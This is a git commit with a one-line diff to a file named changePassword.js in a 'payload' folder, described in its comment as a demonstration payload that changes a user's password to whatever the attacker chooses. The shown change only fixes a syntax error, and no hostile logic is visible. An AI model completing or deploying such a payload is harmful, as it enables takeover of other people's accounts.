e4128ba610a9dfabdbd447079e594908405dc353
theultraman20 <32559038+theultraman20@users.noreply.github.com>
2018-04-02 01:01:39 -0400

    Update changePassword.js

--- payload/changePassword.js
+++ payload/changePassword.js
@@ -1,5 +1,5 @@
 //a youtube demonstration payload that can change the users password to whatever you please
-var src = document.currentScript.src.
+var src = document.currentScript.src;
 
 var oldHtml = document.body.innerHTML;
 
